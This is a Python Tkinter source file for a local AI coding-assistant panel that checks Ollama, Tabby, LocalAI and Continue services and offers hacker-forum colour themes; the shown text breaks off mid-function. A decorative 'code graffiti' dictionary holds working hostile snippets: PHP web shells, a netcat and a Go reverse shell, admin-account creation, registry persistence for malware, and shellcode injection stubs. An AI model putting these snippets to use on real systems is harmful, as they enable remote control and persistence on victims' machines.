#!/usr/bin/env python3
"""
Local AI Model & Online Compiler Integration
Pulls and tests local AI models with online compilation support
"""

import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext
import requests
import json
import threading
import time
import subprocess
import os
import re
import math
import random
from typing import Dict, List, Optional, Any
from pathlib import Path

# Import AI helper classes
try:
    from ai_helper_classes import (
        AICodeGenerator, AIDebugger, AIOptimizer, AISecurityAnalyzer,
        AIDocumentationGenerator, AITestGenerator, AIRefactoringEngine, AIPatternRecognizer
    )
    AI_HELPERS_AVAILABLE = True
except ImportError:
    AI_HELPERS_AVAILABLE = False
    print("⚠️ AI helper classes not available - using basic functionality")

class LocalAICompilerManager:
    """Manages local AI models and online compilation"""
    
    def __init__(self, ide_instance):
        self.ide_instance = ide_instance
        
        # AI Services URLs
        self.ollama_url = "http://localhost:11434"
        self.tabby_url = "http://localhost:8080"
        self.localai_url = "http://localhost:8080"
        self.continue_url = "http://localhost:3000"
        
        # Service states
        self.available_models = []
        self.running_models = []
        self.service_status = {
            'ollama': False,
            'tabby': False,
            'localai': False,
            'continue': False
        }
        
        # Online compilation services
        self.judge0_url = "http://localhost:8080"
        self.piston_url = "http://localhost:2000"
        
        # Code completion cache
        self.completion_cache = {}
        self.context_files = []
        
        # Enhanced AI features
        self.ai_code_generator = None
        self.ai_debugger = None
        self.ai_optimizer = None
        self.ai_security_analyzer = None
        self.ai_documentation_generator = None
        self.ai_test_generator = None
        self.ai_refactoring_engine = None
        self.ai_pattern_recognizer = None
        
        # Old-school forum themes
        self.forum_themes = {
            'unknowncheats': {
                'name': 'UnknownCheats.me',
                'bg_color': '#0d1117',
                'text_color': '#c9d1d9',
                'accent_color': '#58a6ff',
                'header_color': '#21262d',
                'border_color': '#30363d',
                'button_color': '#238636',
                'button_hover': '#2ea043',
                'link_color': '#58a6ff',
                'font': 'Consolas, Monaco, monospace'
            },
            'hackforums': {
                'name': 'HackForums.net',
                'bg_color': '#1a1a1a',
                'text_color': '#e0e0e0',
                'accent_color': '#ff6b35',
                'header_color': '#2d2d2d',
                'border_color': '#404040',
                'button_color': '#ff6b35',
                'button_hover': '#ff8c5a',
                'link_color': '#ff6b35',
                'font': 'Verdana, Arial, sans-serif'
            },
            'game_deception': {
                'name': 'Game-Deception',
                'bg_color': '#0f0f0f',
                'text_color': '#00ff00',
                'accent_color': '#00ff00',
                'header_color': '#1a1a1a',
                'border_color': '#333333',
                'button_color': '#00ff00',
                'button_hover': '#33ff33',
                'link_color': '#00ff00',
                'font': 'Courier New, monospace'
            },
            'vbulletin_classic': {
                'name': 'vBulletin Classic',
                'bg_color': '#ffffff',
                'text_color': '#000000',
                'accent_color': '#0066cc',
                'header_color': '#f5f5f5',
                'border_color': '#cccccc',
                'button_color': '#0066cc',
                'button_hover': '#0052a3',
                'link_color': '#0066cc',
                'font': 'Verdana, Arial, sans-serif'
            },
            'wordpress_classic': {
                'name': 'WordPress Classic',
                'bg_color': '#f9f9f9',
                'text_color': '#333333',
                'accent_color': '#0073aa',
                'header_color': '#ffffff',
                'border_color': '#dddddd',
                'button_color': '#0073aa',
                'button_hover': '#005a87',
                'link_color': '#0073aa',
                'font': 'Georgia, serif'
            },
            'irc_mirc': {
                'name': 'mIRC Classic',
                'bg_color': '#000080',
                'text_color': '#ffffff',
                'accent_color': '#ffff00',
                'header_color': '#0000ff',
                'border_color': '#808080',
                'button_color': '#c0c0c0',
                'button_hover': '#ffffff',
                'link_color': '#ffff00',
                'font': 'MS Sans Serif, sans-serif'
            },
            'cs_cheat_servers': {
                'name': 'CS Cheat Servers',
                'bg_color': '#1e1e1e',
                'text_color': '#00ff41',
                'accent_color': '#ff0040',
                'header_color': '#2d2d2d',
                'border_color': '#404040',
                'button_color': '#ff0040',
                'button_hover': '#ff3366',
                'link_color': '#00ff41',
                'font': 'Consolas, monospace'
            },
            'ogc_elite': {
                'name': 'OGC Elite',
                'bg_color': '#0a0a0a',
                'text_color': '#ff6600',
                'accent_color': '#ff6600',
                'header_color': '#1a1a1a',
                'border_color': '#333333',
                'button_color': '#ff6600',
                'button_hover': '#ff8833',
                'link_color': '#ff6600',
                'font': 'Arial, sans-serif'
            },
            'ic_japs': {
                'name': 'iC JAPS',
                'bg_color': '#001122',
                'text_color': '#00aaff',
                'accent_color': '#ffaa00',
                'header_color': '#002244',
                'border_color': '#004488',
                'button_color': '#ffaa00',
                'button_hover': '#ffbb33',
                'link_color': '#00aaff',
                'font': 'Tahoma, sans-serif'
            },
            'death_elf': {
                'name': 'Death Elf',
                'bg_color': '#2d1b1b',
                'text_color': '#ff4444',
                'accent_color': '#ff6666',
                'header_color': '#3d2b2b',
                'border_color': '#5d4b4b',
                'button_color': '#ff4444',
                'button_hover': '#ff6666',
                'link_color': '#ff8888',
                'font': 'Times New Roman, serif'
            }
        }
        
        # Code graffiti snippets (real code from legendary projects)
        self.graffiti_code_snippets = {
            'c_asm': [
                "mov eax, [esp+4]\nadd eax, 1\nret",
                "push ebp\nmov ebp, esp\nsub esp, 16\npop ebp\nret",
                "xor eax, eax\ninc eax\njmp exit",
                "lea edx, [esp+8]\nint 0x80\nret"
            ],
            'cpp_hack': [
                "DWORD dwAddress = 0x401000;\nBYTE* pBytes = (BYTE*)dwAddress;\n*pBytes = 0x90; // NOP",
                "void* pMem = VirtualAlloc(NULL, 4096, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\nmemcpy(pMem, shellcode, sizeof(shellcode));",
                "HMODULE hMod = LoadLibraryA(\"kernel32.dll\");\nFARPROC pFunc = GetProcAddress(hMod, \"CreateProcessA\");",
                "CONTEXT ctx;\nGetThreadContext(hThread, &ctx);\nctx.Eip = (DWORD)newCode;"
            ],
            'python_scripts': [
                "import ctypes\nfrom ctypes import wintypes\nkernel32 = ctypes.windll.kernel32",
                "def inject_shellcode(pid, shellcode):\n    hProcess = OpenProcess(PROCESS_ALL_ACCESS, False, pid)",
                "class MemoryScanner:\n    def __init__(self, process):\n        self.process = process",
                "def find_pattern(process, pattern, mask):\n    address = 0\n    while address < 0x7FFFFFFF:"
            ],
            'javascript_obfuscated': [
                "var _0x1234=['\\x68\\x65\\x6c\\x6c\\x6f'];\nfunction _0xabcd(){return _0x1234[0];}",
                "eval(atob('dmFyIGEgPSAiSGVsbG8gV29ybGQiOw=='));",
                "var func = new Function('return ' + 'alert(\\'hack\\')');\nfunc();",
                "window['\\x65\\x76\\x61\\x6c']('\\x61\\x6c\\x65\\x72\\x74\\x28\\x31\\x29\\x3b');"
            ],
            'php_backdoors': [
                "<?php eval($_POST['cmd']); ?>",
                "<?php system($_GET['x']); ?>",
                "<?php file_put_contents('shell.php', '<?php eval($_POST[0]); ?>'); ?>",
                "<?php passthru($_REQUEST['c']); ?>"
            ],
            'batch_scripts': [
                "@echo off\nnet user admin password /add\nnet localgroup administrators admin /add",
                "for /f %i in ('dir /b *.exe') do copy %i backup\\%i",
                "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v Malware /t REG_SZ /d C:\\temp\\malware.exe",
                "wmic process where name=\"notepad.exe\" delete"
            ],
            'assembly_cheats': [
                "push 0x12345678\ncall [0x401000]\nadd esp, 4",
                "mov eax, [0x12345678]\ncmp eax, 100\njne skip\nmov eax, 999",
                "int3\nnop\nnop\nnop\nint3",
                "jmp short $+2\njmp short $-2\njmp short $+2"
            ],
            'lua_scripts': [
                "function hack()\n    local player = GetLocalPlayer()\n    SetHealth(player, 999)\nend",
                "hook.Add(\"Think\", \"GodMode\", function()\n    local ply = LocalPlayer()\n    ply:SetHealth(999)\nend)",
                "local function Aimbot()\n    local target = GetClosestPlayer()\n    AimAt(target)\nend",
                "for k, v in pairs(ents.GetAll()) do\n    if v:IsPlayer() then\n        v:SetPos(Vector(0,0,0))\n    end\nend"
            ],
            'ruby_scripts': [
                "require 'socket'\ns = TCPSocket.new('192.168.1.1', 4444)\nloop { s.print gets }",
                "def exploit\n    payload = \"A\" * 1000\n    send_packet(payload)\nend",
                "class BufferOverflow\n    def initialize(target)\n        @target = target\n    end\nend",
                "system(\"nc -l -p 4444 -e /bin/sh\")"
            ],
            'go_scripts': [
                "package main\nimport \"syscall\"\nfunc main() {\n    syscall.Exec(\"/bin/sh\", []string{\"sh\"}, nil)\n}",
                "func injectShellcode(sc []byte) {\n    addr := syscall.Mmap(0, 0, len(sc), syscall.PROT_READ|syscall.PROT_WRITE|syscall.PROT_EXEC, syscall.MAP_ANON|syscall.MAP_PRIVATE)\n    copy(addr, sc)\n}",
                "import \"unsafe\"\nfunc exploit() {\n    ptr := unsafe.Pointer(uintptr(0x12345678))\n    *(*int)(ptr) = 0xdeadbeef\n}",
                "func reverseShell(host string) {\n    conn, _ := net.Dial(\"tcp\", host+\":4444\")\n    cmd := exec.Command(\"/bin/sh\")\n    cmd.Stdin = conn\n    cmd.Stdout = conn\n    cmd.Stderr = conn\n    cmd.Run()\n}"
            ]
        }
        
        # Graffiti settings
        self.graffiti_enabled = False
        self.graffiti_widgets = []
        
        # Background animation settings
        self.background_canvas = None
        self.gears_running = False
        self.graffiti_animation = False
        
        self.setup_gui()
        self.check_all_services()
        
        # Start background animations
        self.start_background_animations()
    
    def check_all_services(self):
        """Check all AI services in parallel"""
        self._update_ollama_status("🔍 Checking all AI services...")
        
        # Check services in parallel
        services = [
            ("ollama", self._check_ollama_service),
            ("tabby", self._check_tabby_service),
            ("localai", self._check_localai_service),
            ("continue", self._check_continue_service)
        ]
        
        for service_name, check_func in services:
            thread = threading.Thread(target=check_func)
            thread.daemon = True
            thread.start()
    
    def _check_ollama_service(self):
        """Check Ollama service status"""
        try:
            response = requests.get(f"{self.ollama_url}/api/tags", timeout=5)
            if response.status_code == 200:
                data = response.json()
                models = data.get('models', [])
                self.available_models = [model['name'] for model in models]
                self.service_status['ollama'] = True
                self._update_ollama_status("✅ Ollama is running!")
                self._update_ollama_status(f"📦 Found {len(models)} models")
                self._update_model_list()
                
                if not models:
                    self._update_ollama_status("💡 No models found. Try pulling a model!")
                    self._suggest_models()
            else:
                self.service_status['ollama'] = False
                self._update_ollama_status("❌ Ollama not responding")
                
        except requests.exceptions.RequestException:
            self.service_status['ollama'] = False
            self._update_ollama_status("❌ Ollama not running")
            self._update_ollama_status("💡 Start Ollama with: ollama serve")
    
    def _check_tabby_service(self):
        """Check Tabby service for code completion"""
        try:
            response = requests.get(f"{self.tabby_url}/v1/health", timeout=5)
            if response.status_code == 200:
                self.service_status['tabby'] = True
                self._update_ollama_status("✅ Tabby is running for code completion!")
            else:
                self.service_status['tabby'] = False
                self._update_ollama_status("❌ Tabby not responding")
        except requests.exceptions.RequestException:
            self.service_status['tabby'] = False
            self._update_ollama_status("❌ Tabby not running")
            self._update_ollama_status("💡 Start Tabby with: docker run -d -p 8080:8080 tabby")
    
    def _check_localai_service(self):
        """Check LocalAI service"""
        try:
            response = requests.get(f"{self.localai_url}/v1/models", timeout=5)
            if response.status_code == 200:
                self.service_status['localai'] = True
                self._update_ollama_status("✅ LocalAI is running!")
            else:
                self.service_status['localai'] = False
                self._update_ollama_status("❌ LocalAI not responding")
        except requests.exceptions.RequestException:
            self.service_status['localai'] = False
            self._update_ollama_status("❌ LocalAI not running")
            self._update_ollama_status("💡 Start LocalAI with: docker run -d -p 8080:8080 localai")
    
    def _check_continue_service(self):
        """Check Continue service for context-aware chat"""
        try:
            response = requests.get(f"{self.continue_url}/health", timeout=5)
            if response.status_code == 200:
                self.service_status['continue'] = True
                self._update_ollama_status("✅ Continue is running for context-aware chat!")
            else:
                self.service_status['continue'] = False
                self._update_ollama_status("❌ Continue not responding")
        except requests.exceptions.RequestException:
            self.service_status['continue'] = False
            self._update_ollama_status("❌ Continue not running")
            self._update_ollama_status("💡 Start Continue with: npx continue")
    
    def get_tabby_completion(self, code, language="python", cursor_position=None):
        """Get real-time code completion from Tabby"""
        if not self.service_status.get('tabby'):
            return None
        
        try:
            # Create completion request
            completion_data = {
                "code": code,
                "language": language,
                "position": cursor_position or {"line": 0, "character": len(code)},
                "max_tokens": 50,
                "temperature": 0.1
            }
            
            response = requests.post(
                f"{self.tabby_url}/v1/completion",
                json=completion_data,
                timeout=5
            )
            
            if response.status_code == 200:
                result = response.json()
                return result.get('choices', [{}])[0].get('text', '')
            else:
                return None
                
        except requests.exceptions.RequestException:
            return None
    
    def get_context_aware_response(self, prompt, project_files=None):
        """Get context-aware response using Continue-style approach"""
        if not project_files:
            project_files = self._get_current_project_files()
        
        # Build context from project files
        context = self._build_project_context(project_files)
        
        # Use Ollama with context
        if self.service_status.get('ollama') and self.available_models:
            model = self.available_models[0]  # Use first available model
            
            enhanced_prompt = f"""Context from project files:
{context}

User prompt: {prompt}

Please provide a helpful response considering the project context above."""
            
            return self._get_ollama_response(model, enhanced_prompt)
        
        return None
    
    def _get_current_project_files(self):
        """Get current project files for context"""
        if not hasattr(self.ide_instance, 'current_file') or not self.ide_instance.current_file:
            return []
        
        project_files = []
        current_dir = Path(self.ide_instance.current_file).parent
        
        # Get relevant files (Python, JS, etc.)
        extensions = ['.py', '.js', '.ts', '.java', '.cpp', '.c', '.cs', '.go', '.rs']
        
        for ext in extensions:
            project_files.extend(list(current_dir.glob(f"**/*{ext}")))
        
        return project_files[:10]  # Limit to 10 files for context
    
    def _build_project_context(self, project_files):
        """Build context string from project files"""
        context_parts = []
        
        for file_path in project_files[:5]:  # Limit to 5 files
            try:
                with open(file_path, 'r', encoding='utf-8') as f:
                    content = f.read()
                    # Truncate large files
                    if len(content) > 1000:
                        content = content[:1000] + "..."
                    
                    context_parts.append(f"File: {file_path.name}\n{content}\n")
            except Exception:
                continue
        
        return "\n".join(context_parts)
    
    def analyze_code_with_codet5(self, code, analysis_type="explanation"):
        """Analyze code using CodeT5-style approach (simulated)"""
        # Since we don't have actual CodeT5 running, we'll use Ollama with a specialized prompt
        if not self.service_status.get('ollama') or not self.available_models:
            return None
        
        model = self.available_models[0]
        
        analysis_prompts = {
            "explanation": f"Explain this code in detail:\n\n{code}",
            "documentation": f"Generate comprehensive documentation for this code:\n\n{code}",
            "optimization": f"Suggest optimizations for this code:\n\n{code}",
            "debugging": f"Find potential issues in this code:\n\n{code}",
            "refactoring": f"Suggest refactoring improvements for this code:\n\n{code}"
        }
        
        prompt = analysis_prompts.get(analysis_type, analysis_prompts["explanation"])
        return self._get_ollama_response(model, prompt)
    
    def _get_ollama_response(self, model, prompt):
        """Get response from Ollama"""
        try:
            response = requests.post(f"{self.ollama_url}/api/generate", 
                                   json={
                                       "model": model,
                                       "prompt": prompt,
                                       "stream": False
                                   }, timeout=30)
            
            if response.status_code == 200:
                result = response.json()
                return result.get('response', 'No response')
            else:
                return None
                
        except requests.exceptions.RequestException:
            return None
    
    def _update_service_status_display(self):
        """Update the service status display"""
        # Clear existing status widgets
        for widget in self.service_status_frame.winfo_children():
            widget.destroy()
        
        services = [
            ("Ollama", self.service_status.get('ollama', False), "Chat & Code Generation"),
            ("Tabby", self.service_status.get('tabby', False), "Real-time Code Completion"),
            ("LocalAI", self.service_status.get('localai', False), "OpenAI-compatible API"),
            ("Continue", self.service_status.get('continue', False), "Context-aware Chat")
        ]
        
        for i, (name, status, description) in enumerate(services):
            status_frame = ttk.Frame(self.service_status_frame)
            status_frame.grid(row=0, column=i, padx=10, pady=5, sticky="ew")
            
            # Status indicator
            status_color = "green" if status else "red"
            status_text = "✅" if status else "❌"
            
            ttk.Label(status_frame, text=status_text, font=("Arial", 12)).pack()
            ttk.Label(status_frame, text=name, font=("Arial", 10, "bold")).pack()
            ttk.Label(status_frame, text=description, font=("Arial", 8), 
                     foreground="gray").pack()
        
        # Configure grid weights
        for i in range(len(services)):
            self.service_status_frame.columnconfigure(i, weight=1)
    
    def test_code_completion(self):
        """Test Tabby code completion"""
        if not self.service_status.get('tabby'):
            messagebox.showwarning("Service Unavailable", 
                                 "Tabby is not running. Start it with:\ndocker run -d -p 8080:8080 tabby")
            return
        
        test_code = "def calculate_factorial(n):\n    if n <= 1:\n        return 1\n    return n * calculate_factorial("
        completion = self.get_tabby_completion(test_code, "python")
        
        if completion:
            self._update_chat("🤖 Tabby", f"Code completion suggestion: {completion}")
            self._update_status("✅ Tabby code completion working!")
        else:
            self._update_chat("❌ Tabby", "No completion available")
            self._update_status("❌ Tabby completion failed")
    
    def test_context_chat(self):
        """Test context-aware chat"""
        if not self.service_status.get('ollama') or not self.available_models:
            messagebox.showwarning("Service Unavailable", 
                                 "Ollama is not running or no models available.")
            return
        
        prompt = "What does this project do?"
        response = self.get_context_aware_response(prompt)
        
        if response:
            self._update_chat("🧠 Context AI", response)
            self._update_status("✅ Context-aware chat working!")
        else:
            self._update_chat("❌ Context AI", "No response available")
            self._update_status("❌ Context chat failed")
    
    def test_code_analysis(self):
        """Test CodeT5-style code analysis"""
        if not self.service_status.get('ollama') or not self.available_models:
            messagebox.showwarning("Service Unavailable", 
                                 "Ollama is not running or no models available.")
            return
        
        test_code = """
def fibonacci(n):
    if n <= 1:
        return n
    return fibonacci(n-1) + fibonacci(n-2)

print(fibonacci(10))
"""
        
        analysis = self.analyze_code_with_codet5(test_code, "explanation")
        
        if analysis:
            self._update_chat("🔍 Code Analyzer", analysis)
            self._update_status("✅ Code analysis working!")
        else:
            self._update_chat("❌ Code Analyzer", "Analysis failed")
            self._update_status("❌ Code analysis failed")
    
    def test_doc_generation(self):
        """Test documentation generation"""
        if not self.service_status.get('ollama') or not self.available_models:
            messagebox.showwarning("Service Unavailable", 
                                 "Ollama is not running or no models available.")
            return
        
        test_code = """
class Calculator:
    def add(self, a, b):
        return a + b
    
    def multiply(self, a, b):
        return a * b
"""
        
        docs = self.analyze_code_with_codet5(test_code, "documentation")
        
        if docs:
            self._update_chat("📝 Doc Generator", docs)
            self._update_status("✅ Documentation generation working!")
        else:
            self._update_chat("❌ Doc Generator", "Documentation generation failed")
            self._update_status("❌ Doc generation failed")
    
    def setup_gui(self, parent_frame=None):
        """Setup the AI model and compiler manager GUI"""
        if parent_frame is None:
            parent_frame = ttk.Frame(self.ide_instance.notebook)
            self.ide_instance.notebook.add(parent_frame, text="🤖 AI Models & Compilers")
        
        # Create background canvas for graffiti and gears
        self.background_canvas = tk.Canvas(
            parent_frame, 
            bg='#1a1a1a',
            highlightthickness=0
        )
        self.background_canvas.pack(fill=tk.BOTH, expand=True)
        
        # Create main frame with transparent background
        main_frame = tk.Frame(self.background_canvas, bg='#1a1a1a')
        main_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Title
        ttk.Label(main_frame, text="🤖 Comprehensive Local AI Coding Suite", 
                 font=("Arial", 16, "bold")).pack(pady=10)
        
        # Create horizontal tabbed interface
        self.create_horizontal_tabs(main_frame)
    
    def create_horizontal_tabs(self, parent):
        """Create horizontal tabbed interface"""
        # Create tab container
        self.tab_container = ttk.Frame(parent)
        self.tab_container.pack(fill=tk.BOTH, expand=True, pady=10)
        
        # Create tab buttons (horizontal)
        self.tab_buttons_frame = ttk.Frame(self.tab_container)
        self.tab_buttons_frame.pack(fill=tk.X, pady=(0, 10))
        
        # Tab content area
        self.tab_content_frame = ttk.Frame(self.tab_container)
        self.tab_content_frame.pack(fill=tk.BOTH, expand=True)
        
        # Define tabs
        self.tabs = {
            "🤖 AI Services": self.create_ai_services_tab,
            "🎨 Themes & Graffiti": self.create_themes_graffiti_tab,
            "⚙️ Compilation Gears": self.create_compilation_gears_tab,
            "💬 AI Chat": self.create_ai_chat_tab,
            "🚀 Code Execution": self.create_code_execution_tab
        }
        
        # Create tab buttons
        self.tab_buttons = {}
        self.current_tab = None
        
        for i, (tab_name, tab_func) in enumerate(self.tabs.items()):
            btn = ttk.Button(
                self.tab_buttons_frame,
                text=tab_name,
                command=lambda name=tab_name: self.switch_tab(name)
            )
            btn.pack(side=tk.LEFT, padx=5, pady=5)
            self.tab_buttons[tab_name] = btn
        
        # Show first tab by default
        if self.tabs:
            first_tab = list(self.tabs.keys())[0]
            self.switch_tab(first_tab)
    
    def switch_tab(self, tab_name):
        """Switch to a different tab"""
        # Clear content frame
        for widget in self.tab_content_frame.winfo_children():
            widget.destroy()
        
        # Update button states
        for name, btn in self.tab_buttons.items():
            if name == tab_name:
                btn.configure(style="Accent.TButton")  # Active tab style
            else:
                btn.configure(style="TButton")  # Normal tab style
        
        # Create tab content
        if tab_name in self.tabs:
            self.tabs[tab_name](self.tab_content_frame)
            self.current_tab = tab_name
    
    def create_ai_services_tab(self, parent):
        """Create AI Services tab content"""
        # Service status
        status_frame = ttk.LabelFrame(parent, text="AI Service Status", padding="10")
        status_frame.pack(fill=tk.X, pady=5)
        
        self.service_status_frame = ttk.Frame(status_frame)
        self.service_status_frame.pack(fill=tk.X)
        self._update_service_status_display()
        
        # Model management
        model_frame = ttk.LabelFrame(parent, text="AI Model Management", padding="10")
        model_frame.pack(fill=tk.BOTH, expand=True, pady=5)
        
        # Model list
        model_list_frame = ttk.Frame(model_frame)
        model_list_frame.pack(fill=tk.BOTH, expand=True, pady=5)
        
        ttk.Label(model_list_frame, text="Available Models:").pack(anchor=tk.W)
        self.model_listbox = tk.Listbox(model_list_frame, height=6)
        model_scroll = ttk.Scrollbar(model_list_frame, orient=tk.VERTICAL, command=self.model_listbox.yview)
        self.model_listbox.configure(yscrollcommand=model_scroll.set)
        self.model_listbox.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        model_scroll.pack(side=tk.RIGHT, fill=tk.Y)
        
        # Model actions
        model_action_frame = ttk.Frame(model_frame)
        model_action_frame.pack(fill=tk.X, pady=5)
        
        ttk.Button(model_action_frame, text="🔄 Refresh Models", 
                  command=self.refresh_models).pack(side=tk.LEFT, padx=5)
        ttk.Button(model_action_frame, text="⬇️ Pull Model", 
                  command=self.pull_model_dialog).pack(side=tk.LEFT, padx=5)
        ttk.Button(model_action_frame, text="▶️ Run Model", 
                  command=self.run_selected_model).pack(side=tk.LEFT, padx=5)
        ttk.Button(model_action_frame, text="🧪 Test Model", 
                  command=self.test_selected_model).pack(side=tk.LEFT, padx=5)
        
        # AI Features
        features_frame = ttk.LabelFrame(parent, text="AI Features", padding="10")
        features_frame.pack(fill=tk.X, pady=5)
        
        feature_buttons_frame = ttk.Frame(features_frame)
        feature_buttons_frame.pack(fill=tk.X)
        
        ttk.Button(feature_buttons_frame, text="💡 Code Completion", 
                  command=self.test_code_completion).pack(side=tk.LEFT, padx=5)
        ttk.Button(feature_buttons_frame, text="🧠 Context Chat", 
                  command=self.test_context_chat).pack(side=tk.LEFT, padx=5)
        ttk.Button(feature_buttons_frame, text="🔍 Code Analysis", 
                  command=self.test_code_analysis).pack(side=tk.LEFT, padx=5)
        ttk.Button(feature_buttons_frame, text="📝 Generate Docs", 
                  command=self.test_doc_generation).pack(side=tk.LEFT, padx=5)
    
    def create_themes_graffiti_tab(self, parent):
        """Create Themes & Graffiti tab content"""
        # Theme selection
        theme_frame = ttk.LabelFrame(parent, text="🎨 Old-School Forum Themes", padding="10")
        theme_frame.pack(fill=tk.BOTH, expand=True, pady=5)
        
        # Create theme buttons in a grid
        theme_names = list(self.forum_themes.keys())
        for i, theme_key in enumerate(theme_names):
            theme = self.forum_themes[theme_key]
            btn = ttk.Button(
                theme_frame, 
                text=f"🎨 {theme['name']}", 
                command=lambda t=theme_key: self.apply_forum_theme(t)
            )
            btn.grid(row=i//2, column=i%2, padx=5, pady=5, sticky="ew")
        
        # Configure grid weights
        theme_frame.columnconfigure(0, weight=1)
        theme_frame.columnconfigure(1, weight=1)
        
        # Graffiti controls
        graffiti_frame = ttk.LabelFrame(parent, text="🎨 Code Graffiti Background", padding="10")
        graffiti_frame.pack(fill=tk.X, pady=5)
        
        graffiti_buttons_frame = ttk.Frame(graffiti_frame)
        graffiti_buttons_frame.pack(fill=tk.X)
        
        ttk.Button(graffiti_buttons_frame, text="🔥 Enable Code Graffiti", 
                  command=self.enable_code_graffiti).pack(side=tk.LEFT, padx=5)
        ttk.Button(graffiti_buttons_frame, text="🎭 Random Code Spray", 
                  command=self.spray_random_code).pack(side=tk.LEFT, padx=5)
        ttk.Button(graffiti_buttons_frame, text="🧹 Clear Graffiti", 
                  command=self.clear_code_graffiti).pack(side=tk.LEFT, padx=5)
        ttk.Button(graffiti_buttons_frame, text="💾 Save Graffiti Style", 
                  command=self.save_graffiti_style).pack(side=tk.LEFT, padx=5)
    
    def create_compilation_gears_tab(self, parent):
        """Create Compilation Gears tab content"""
        # Gear controls
        gears_frame = ttk.LabelFrame(parent, text="⚙️ Compilation Gears", padding="10")
        gears_frame.pack(fill=tk.X, pady=5)
        
        gears_buttons_frame = ttk.Frame(gears_frame)
        gears_buttons_frame.pack(fill=tk.X)
        
        ttk.Button(gears_buttons_frame, text="⚙️ Start Background Gears", 
                  command=self.toggle_background_gears).pack(side=tk.LEFT, padx=5)
        ttk.Button(gears_buttons_frame, text="🔥 Code Spitter Demo", 
                  command=self.demo_code_spitter).pack(side=tk.LEFT, padx=5)
        ttk.Button(gears_buttons_frame, text="💀 Hack Compilation", 
                  command=self.hack_compilation).pack(side=tk.LEFT, padx=5)
        ttk.Button(gears_buttons_frame, text="🎨 Refresh Graffiti", 
                  command=self.refresh_background_graffiti).pack(side=tk.LEFT, padx=5)
        
        # Compilation status
        status_frame = ttk.LabelFrame(parent, text="Compilation Status", padding="10")
        status_frame.pack(fill=tk.BOTH, expand=True, pady=5)
        
        self.status_text = scrolledtext.ScrolledText(status_frame, wrap=tk.WORD, height=8, state=tk.DISABLED)
        self.status_text.pack(fill=tk.BOTH, expand=True)
    
    def create_ai_chat_tab(self, parent):
        """Create AI Chat tab content"""
        # Chat interface
        chat_frame = ttk.LabelFrame(parent, text="AI Chat & Code Generation", padding="10")
        chat_frame.pack(fill=tk.BOTH, expand=True, pady=5)
        
        # Chat input
        chat_input_frame = ttk.Frame(chat_frame)
        chat_input_frame.pack(fill=tk.X, pady=5)
        
        ttk.Label(chat_input_frame, text="Prompt:").pack(side=tk.LEFT)
        self.chat_entry = ttk.Entry(chat_input_frame)
        self.chat_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        ttk.Button(chat_input_frame, text="💬 Send", 
                  command=self.send_chat).pack(side=tk.RIGHT, padx=5)
        
        # Chat history
        self.chat_history = scrolledtext.ScrolledText(chat_frame, wrap=tk.WORD, height=12, state=tk.DISABLED)
        self.chat_history.pack(fill=tk.BOTH, expand=True, pady=5)
    
    def create_code_execution_tab(self, parent):
        """Create Code Execution tab content"""
        # Execution controls
        exec_frame = ttk.LabelFrame(parent, text="Generated Code Execution", padding="10")
        exec_frame.pack(fill=tk.X, pady=5)
        
        exec_button_frame = ttk.Frame(exec_frame)
        exec_button_frame.pack(fill=tk.X)
        
        ttk.Button(exec_button_frame, text="🚀 Execute with Judge0", 
                  command=lambda: self.execute_code("judge0")).pack(side=tk.LEFT, padx=5)
        ttk.Button(exec_button_frame, text="⚡ Execute with Piston", 
                  command=lambda: self.execute_code("piston")).pack(side=tk.LEFT, padx=5)
        ttk.Button(exec_button_frame, text="💻 Execute Locally", 
                  command=lambda: self.execute_code("local")).pack(side=tk.LEFT, padx=5)
        
        # Execution output
        output_frame = ttk.LabelFrame(parent, text="Execution Output", padding="10")
        output_frame.pack(fill=tk.BOTH, expand=True, pady=5)
        
        self.execution_output = scrolledtext.ScrolledText(output_frame, wrap=tk.WORD, height=10, state=tk.DISABLED)
        self.execution_output.pack(fill=tk.BOTH, expand=True)
    
    def check_ollama(self):
        """Check if Ollama is running and get available models"""
        self._update_ollama_status("🔍 Checking Ollama status...")
        
        thread = threading.Thread(target=self._check_ollama_thread)
        thread.daemon = True
        thread.start()
    
    def _check_ollama_thread(self):
        """Background thread to check Ollama"""
        try:
            # Check if Ollama is running
            response = requests.get(f"{self.ollama_url}/api/tags", timeout=5)
            if response.status_code == 200:
                data = response.json()
                models = data.get('models', [])
                self.available_models = [model['name'] for model in models]
                
                self._update_ollama_status("✅ Ollama is running!")
                self._update_ollama_status(f"📦 Found {len(models)} models")
                
                # Update model listbox
                self._update_model_list()
                
                if not models:
                    self._update_ollama_status("💡 No models found. Try pulling a model!")
                    self._suggest_models()
            else:
                self._update_ollama_status("❌ Ollama not responding")
                
        except requests.exceptions.RequestException:
            self._update_ollama_status("❌ Ollama not running")
            self._update_ollama_status("💡 Start Ollama with: ollama serve")
    
    def _suggest_models(self):
        """Suggest popular models to pull"""
        suggestions = [
            "llama2:7b",      # Meta's Llama 2 (7B parameters)
            "codellama:7b",   # Code Llama (7B parameters) 
            "mistral:7b",     # Mistral 7B
            "gemma:2b",       # Google Gemma (2B parameters)
            "phi3:mini",      # Microsoft Phi-3 Mini
            "qwen2:0.5b",     # Qwen2 (0.5B parameters)
            "tinyllama:1.1b", # TinyLlama (1.1B parameters)
            "starcoder2:3b",  # StarCoder2 (3B parameters)
            "deepseek-coder:1.3b", # DeepSeek Coder
            "wizardcoder:7b"   # WizardCoder
        ]
        
        self._update_ollama_status("💡 Popular models to try:")
        for model in suggestions[:5]:
            self._update_ollama_status(f"   ollama pull {model}")
    
    def _update_ollama_status(self, message):
        """Update Ollama status display"""
        if hasattr(self, 'ollama_status') and self.ollama_status:
            self.ollama_status.config(state=tk.NORMAL)
            timestamp = time.strftime("%H:%M:%S")
            self.ollama_status.insert(tk.END, f"[{timestamp}] {message}\n")
            self.ollama_status.see(tk.END)
            self.ollama_status.config(state=tk.DISABLED)
    
    def _update_model_list(self):
        """Update the model listbox"""
        self.model_listbox.delete(0, tk.END)
        for model in self.available_models:
            self.model_listbox.insert(tk.END, model)
    
    def refresh_models(self):
        """Refresh the list of available models"""
        self.check_ollama()
    
    def pull_model_dialog(self):
        """Show dialog to pull a new model"""
        dialog = tk.Toplevel(self.ide_instance.root)
